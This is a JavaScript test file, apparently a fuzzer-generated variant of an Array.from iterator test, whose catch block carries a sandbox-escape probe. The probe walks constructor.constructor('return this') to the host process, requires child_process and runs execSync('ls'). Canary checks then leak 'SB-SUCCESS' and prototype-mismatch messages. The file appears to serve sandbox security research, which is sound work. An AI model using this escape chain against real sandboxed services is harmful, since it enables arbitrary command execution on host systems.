try {
    var thisVals = [];
    var nextResult = {
        done: false,
        value: {}
    };
    var nextNextResult = {
        done: false,
        value: {}
    };
    var firstReturnVal = {};
    var secondReturnVal = {};
    var mapFn = function (value, idx) {
        let REPLACER = 23;
        var returnVal = nextReturnVal;
        nextReturnVal = nextNextReturnVal;
        nextNextReturnVal = null;
        return returnVal;
    };
    var nextReturnVal = firstReturnVal;
    var nextNextReturnVal = secondReturnVal;
    var items = {};
    var result;
    items[Symbol.iterator] = function () {
        throw () => {
            return () => {
            };
        };
        return {
            next: function () {
                var result = nextResult;
                nextResult = nextNextResult;
                nextNextResult = { done: true };
                return result;
            }
        };
    };
    result = Array.from(items, mapFn);
    assert.sameValue(result.length, 2);
    assert.sameValue(result[0], firstReturnVal);
    assert.sameValue(result[1], secondReturnVal);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}